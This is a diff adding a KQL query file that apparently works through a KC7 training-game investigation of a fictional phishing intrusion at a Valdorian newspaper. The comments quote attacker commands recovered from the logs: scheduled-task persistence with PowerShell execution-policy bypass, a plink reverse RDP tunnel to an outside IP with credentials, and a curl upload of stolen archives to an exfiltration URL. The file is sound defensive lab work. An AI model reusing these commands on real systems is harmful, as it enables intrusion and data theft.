@@ -1,0 +1,72 @@
+// Module 4 — A Scandal in Valdoria: A Political Mystery
+// Workspace: kc7001.eastus/ValdyTimes
+// Queries replayed on 2026-10-21/22. Section 1 ("KQL 101") and most of the narrative
+// questions give the base query directly; this file keeps the ones that actually
+// advance the investigation, including a few built from the schema (via "View Tables")
+// to pivot into ProcessEvents/FileCreationEvents, which the game only hints at.
+
+// --- Victim 1: Sonia Gose (Senior Editor) — a dead end, but it reveals the TTPs ---
+
+// Step 1 — identify Sonia and her machine
+Employees
+| where name has "Sonia Gose"
+// -> sonia_gose@valdoriantimes.news, username sogose, hostname UL0M-MACHINE, ip 10.10.0.3
+
+// Step 2 — find the phishing email she was shown
+Email
+| where recipient == "sonia_gose@valdoriantimes.news"
+| where sender has "newspaper_jobs"
+// -> from newspaper_jobs@gmail.com, "[EXTERNAL] FW: Invitation to Apply: Lead Political
+//    Correspondent", verdict CLEAN, link to promotionrecruit.com/.../*.docx
+
+// Step 3 — confirm she clicked it
+OutboundNetworkEvents
+| where src_ip == "10.10.0.3"
+| where url contains "promotionrecruit.com"
+// -> 1 hit, 2024-01-05T10:23:17Z
+
+// Step 4 — find what landed on her machine afterward
+FileCreationEvents
+| where hostname == "UL0M-MACHINE"
+// (28 rows; filtering/searching for "hacktivist" finds the payload)
+// -> C:\ProgramData\hacktivist_manifesto.ps1, dropped by explorer.exe at 10:24:32Z
+
+// Step 5 — see what that script did: persistence, then a reverse tunnel
+ProcessEvents
+| where hostname == "UL0M-MACHINE"
+// (328 rows; search "schtasks" and "plink.exe" to isolate the two key commands)
+// -> schtasks /create /sc hourly /mo 5 /tn "Hacktivist Manifesto" /tr "powershell.exe
+//    -ExecutionPolicy Bypass -File C:\ProgramData\hacktivist_manifesto.ps1"
+// -> plink.exe -R 3389:localhost:3389 -ssh -l $had0w -pw thruthW!llS3tUfree 136.130.190.181
+// Only 5 discovery commands follow (whoami, etc.) — nothing else malicious. Dead end:
+// the attacker wasn't after Sonia specifically.
+
+// --- Victim 2: Ronnie McLovin (Editorial Intern) — same actor, real target ---
+// Same phishing/download/schtasks/plink chain repeats on hostname A37A-DESKTOP, IP
+// 10.10.0.19, from attacker IP 168.57.191.100 — but with the SAME credentials
+// ($had0w / thruthW!llS3tUfree), confirming a single actor running both intrusions.
+
+// Step 6 — the smoking gun: the attacker renames a planted file into the exact name
+// that later gets emailed to the printer
+ProcessEvents
+| where hostname == "A37A-DESKTOP"
+// search "fakestory" to isolate this one command
+// -> "move C:\Users\romclovin\Downloads\fakestory.docx
+//     C:\Users\romclovin\Documents\OpEdFinal_to_print.docx" at 2024-01-31T10:26:20Z
+
+// Step 7 — confirm that renamed file was emailed to the printer shortly after
+Email
+| where sender == "ronnie_mclovin@valdoriantimes.news"
+| where recipient has "clark"
+// -> sent 2024-01-31T11:11:12Z, exactly 44 minutes after the rename, subject "URGENT:
+//    Final OpEd Draft Edits (...)", link to .../rmclovin/2024/OpEdFinal_to_print.docx
+//    This is how the fabricated article reached Clark Kent and got published.
+
+// Step 8 — exfiltration: what else the attacker took from Ronnie's machine
+ProcessEvents
+| where hostname == "A37A-DESKTOP"
+// search "curl" to isolate the exfiltration command
+// -> three 7z archives created (DankMemes.7z, MyStolenDataFromDocuments.7z,
+//    MyStolenDataFromDesktop.7z), all password-protected with thruthW!llS3tUfree, then:
+// curl -F "file=@C:\Users\romclovin\Documents\*.7z" https://hirejob.com/exfil_processor/upload.php
+// Confirmed (separately) that no other Valdorian Times device exfiltrated to hirejob.com.
